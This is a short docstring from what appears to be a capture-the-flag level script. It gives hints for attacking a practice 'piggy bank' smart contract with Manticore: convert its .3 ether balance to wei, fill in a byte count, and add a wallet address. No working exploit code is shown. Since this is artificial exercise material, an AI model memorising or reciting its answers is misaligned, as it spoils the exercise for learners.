'''
In this level, we'll have to know the contract balance of the piggy bank
We know that this is .3 ether, but we have to convert that to wei
(hint: this is done in the first manticore script with .5 ether)
There's one more blank (???) that you need to fill in which is the number of bytes in a 256bit uint.
You'll also need to fill in your wallet/ctf address in this file or on the command line (like the previous level)
